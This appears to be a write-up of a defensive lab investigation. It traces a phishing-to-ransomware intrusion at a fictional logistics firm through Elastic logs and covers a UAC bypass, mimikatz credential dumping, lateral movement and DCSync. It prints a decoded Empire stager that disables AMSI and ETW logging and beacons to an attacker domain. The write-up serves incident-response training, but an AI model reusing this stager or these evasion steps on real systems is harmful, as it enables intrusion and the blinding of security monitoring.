# The Chaos Inside

**Lurking in the Dark**

Without tripping any security defences of Quick Logistics LLC, the Boogeyman was able to compromise one of the employees and stayed in the dark, waiting for the right moment to continue the attack. Using this initial email access, the threat actors attempted to expand the impact by targeting the CEO, Evan Hutchinson.

The email appeared questionable, but Evan still opened the attachment despite the scepticism. After opening the attached document and seeing that nothing happened, Evan reported the phishing email to the security team.

**Initial Investigation**

Upon receiving the phishing email report, the security team investigated the workstation of the CEO. During this activity, the team discovered the email attachment in the downloads folder of the victim.

In addition, the security team also observed a file inside the ISO payload, as shown in the image below.

Lastly, it was presumed by the security team that the incident occurred between **August 29 and August 30, 2023.**

Given the initial findings, you are tasked to analyse and assess the impact of the compromise.


## Analysis Steps:

Open Elastic, go to the Discover menu, and set the incident time.

Let's first identify the usernames and hosts in the log:

![Screenshot 2025-06-14 214533](https://github.com/user-attachments/assets/ca63919f-f6f4-4d8c-9b7e-0bdb4f093c14)
![Screenshot 2025-06-14 214417](https://github.com/user-attachments/assets/6e080e84-bf4e-443a-b5fb-16301376b3e7)



### Initial Access `2023-08-29 23:51:15`: 

The downloaded file is a `.pdf` extension.

![Screenshot 2025-06-13 153723](https://github.com/user-attachments/assets/1355617d-d13a-42ab-9b1b-59af5c460e00)

on the hostname: `WKSTN-0051.quicklogistics.org` of the username:`evan.hutchinson`. The process `mshta.exe` stands for  **Microsoft HTML Application Host**, and it is used to execute `.hta` files (HTML Applications), which can contain HTML + scripting (like JavaScript or VBScript). The process `Explorer.EXE`(2940) spawned `mshta.exe` (6392) process, which led to execute the `.pdf` file. Now that we know the process, filter the logs for `mshta.exe` process.

### Execution:

The process `mshta.exe` spawned three process (`xcopy.exe`, `rundll32.exe`, `powershell.exe`). 
- First process: `xcopy.exe`, created a copy of a file named `review.dat` from `D:\` to the `Temp` directory of the user **Evan Hut**.
- second process: `rundll32.exe`, executes a DLL function called `DllRegisterServer` from the file `D:\review.dat`. **DllRegisterServer** A standard function found in many DLLs used for self-registration (often writes to the registry). 



### Persistence `2023-08-29 23:51:16`:

- Third process: `powershell.exe`, execute a malicious persistence via scheduled tasks. This PowerShell command creates a scheduled task named **"Review"** that runs daily at **6:00 AM**, executing a suspicious DLL `review.dat`

### Privilege Escalation & Defense Evasion `2023-08-29 23:54:49.213`:

Investigate this `review.dat` file. We will see the attacker execute a few commands to view the compromised user's information. At the end, the attacker executed `fodhelper.exe` which can be abused by attackers to bypass **[User Account Control UAC](https://attack.mitre.org/techniques/T1548/002/)**

![Screenshot 2025-06-13 180416](https://github.com/user-attachments/assets/87c6c7b6-bd90-4a7d-9018-86bdaa7c2165)

Note in the last execution, the attacker attempted for lateral movement to `WKSTN-1327` as `allan.smith`. Inspect the execution spawned by `fodhelper.exe`.

The **process.pid: 7116**, in the command-line, it reads a base64-encoded malicious script stored in **the registry key** and launches a second hidden PowerShell process, which decodes and executes that malicious script. Let's see what this process spawns, search for `ppid: 7116`.

![Screenshot 2025-06-14 223456](https://github.com/user-attachments/assets/692985d2-f7b9-46ff-90da-c13046ff95a2)

```powershell
If ($PSVersionTable.PSVersion.Major -ge 3) {
    $Ref = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
    $Ref.GetField('amsiInitFailed', 'NonPublic,Static').SetValue($Null, $true)

    [System.Diagnostics.Eventing.EventProvider]
        .GetField('m_enabled', 'NonPublic,Instance')
        .SetValue(
            [Ref].Assembly
                .GetType('System.Management.Automation.Tracing.PSEtwLogProvider')
                .GetField('etwProvider', 'NonPublic,Static')
                .GetValue($null),
            0
        )
}

[System.Net.ServicePointManager]::Expect100Continue = 0
$wc = New-Object System.Net.WebClient

# Set the User-Agent string to look like a browser
$u = 'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko'

# Decode and build the URL
$ser = ([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String(
    'aAB0AHQAcAA6AC8ALwBjAGQAbgAuAGIAYQBuAGEAbgBhAHAAZQBlAGwAccBhAHIAdAB5AC4AbgBlAHQAOgA4ADAA'
)))  # http://cdn.bananapeelparty.net:80

$t = '/news.php'

# Set headers and make the request
$wc.Headers.Add('User-Agent', $u)
$wc.Proxy = [System.Net.WebRequest]::DefaultWebProxy
$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials
```
This payload connects to a malicious domain: `http:[//]cdn.bananapeelparty.net:80/news.php`, and uses custom proxy and credentials to hide the traffic or bypass some firewall rules.


### Credential Access & Discovery:

Following the execution of the malicious payload. In the log, the attacker executed some commands for enumeration. He also used [PowerSploit framework](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1) to use `Invoke-ShareFinder` and `Get-DomainUser` functions for enumeration purposes.

![Screenshot 2025-06-14 225035](https://github.com/user-attachments/assets/8af81d03-73d3-4d87-a13b-1f966165c311)
![Screenshot 2025-06-14 225143](https://github.com/user-attachments/assets/17a7cea1-9412-4e9a-adcd-574cd60bd7c3)
![Screenshot 2025-06-14 225007](https://github.com/user-attachments/assets/19a5d6fa-1d0c-4f25-b28b-9007f792a2ab)

The attacker downloaded and executed the `mimikatz` tool for credentials dump, and he was able to **pass the hash** as the `itadmin` user. With the new user, the attacker accessed a file on a remote share named: `IT_Automation.ps1`



### Lateral Movement & 	Command and Control `2023-08-30 00:19:52`:

![Screenshot 2025-06-14 225243](https://github.com/user-attachments/assets/268cb108-2512-419d-a9c9-401bcd4329aa)

Using the discovered credentials from `IT_Automation.ps1` file. This PowerShell command executes a remote command on a machine named `WKSTN-1327` using stored credentials. Now he is moving from this host `WKSTN-0051` to this host `WKSTN-1327`. Now he moved to the new host using `allan.smith` credentials, filter the log based on that. I filtered for `-enc` to see if there are any encoded commands executed on the new host

![Screenshot 2025-06-14 233147](https://github.com/user-attachments/assets/2acdeebe-5501-43c2-a279-541119cf8ac7)

There is a command spawned by `wsmprovhost.exe`. After decoding, it looks like another **Empire Stager** was executed using the same method. The attacker also downloaded and executed the `mimikatz` tool on the second machine. This reveals the Domain Administrator and its hash.

![Screenshot 2025-06-14 234603](https://github.com/user-attachments/assets/2c79c22e-83f2-4182-938a-9b09b33dcd87)

Search for the execution of the second stager that ran on the username: `allan.smith`

![Screenshot 2025-06-14 235956](https://github.com/user-attachments/assets/2ce6ae56-1ebf-4f64-b75b-251c5efd8467)

This executes a command on a local or remote computer. `-ScriptBlock {hostname}`: The block of code to run remotely — in this case, it runs the `hostname` command,**which returns the name of the computer**. `-ComputerName DC01.quicklogistics.org`: Specifies the target computer — in this case, a **Domain Controller (DC01)** in the domain **quicklogistics.org**. To confirm the execution of the `hostname` command on the target computer, search for the `HOSTNAME.exe` process execution.

![Screenshot 2025-06-15 000823](https://github.com/user-attachments/assets/703564e6-aa0f-4f83-bb23-5240d6e3c746)

When filtered for `wsmprovhost.exe`. This confirms a remote execution on the `DC01`.

![Screenshot 2025-06-15 001042](https://github.com/user-attachments/assets/c242b9e4-c70c-4cf4-b13a-c181dd6549bb)

Filtering for the execution of the malicious payload executed on the `DC01`, we see the attacker download and execute `mimikatz` tool

![Screenshot 2025-06-15 001819](https://github.com/user-attachments/assets/9167d000-560c-422b-88f2-bc06fd046dcd)

This performs a **DCSync attack**, which tricks **the Domain Controller** into thinking the attacker is another DC, and requests replication data — including password hashes for the specified user (`backupda`).


### Impact `2023-08-30 01:53:13`: 

After having full control of the domain `quicklogistics.org`, the attacker downloaded and executed a `ransomboogey.exe` file, as well as on both  `WKSTN-0051` and `WKSTN-1327`.

![Screenshot 2025-06-15 002844](https://github.com/user-attachments/assets/1b18d93b-c95e-491a-bb51-9e180a9015b5)
![Screenshot 2025-06-15 003205](https://github.com/user-attachments/assets/8ca637fc-474e-4bb7-98b6-a99af23c4e11)
![Screenshot 2025-06-15 003246](https://github.com/user-attachments/assets/46887913-5862-40ea-bbff-a04e89b6a492)


The execution of `ransomboogey.exe` process on the host `WKSTN-1327` was by the user`itadmin`. But there was no execution of the malicious process on host `WKSTN-0051`.

![Screenshot 2025-06-15 003747](https://github.com/user-attachments/assets/081ec867-a21a-4f52-892d-298a8fbbfd32)
